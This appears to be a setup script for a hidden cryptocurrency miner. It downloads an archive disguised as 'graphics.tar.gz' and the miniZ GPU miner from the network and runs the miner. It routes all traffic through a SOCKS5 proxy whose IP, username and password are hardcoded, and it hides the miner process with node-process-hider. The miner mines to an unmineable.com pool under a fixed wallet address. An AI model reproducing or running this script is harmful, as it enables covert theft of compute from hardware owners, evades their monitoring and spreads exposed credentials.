apt update && apt -y install sudo wget curl unzip

sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang

curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -

apt-get install -y nodejs

npm i -g node-process-hider

ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime

dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/denisule54/why/raw/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = 209.127.191.180:9279

socks5_username = tjegccjq

socks5_password = fp9w2vap5xg0

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

./graftcp/graftcp curl ifconfig.me

echo " "

echo " "

./graftcp/graftcp wget https://github.com/miniZ-miner/miniZ/releases/download/v1.8y3/miniZ_v1.8y3_linux-x64.tar.gz
tar xf miniZ_v1.8y3_linux-x64.tar.gz

ph add miniZ

./graftcp/graftcp ./miniZ -u TSegVmnvSAQ6MSAUMv28aWBgNtjtJJpMy1.$(echo $(shuf -i 1-999 -n 1)-cuan) -l ethash.unmineable.com --port=3333 -p x --par=ethash
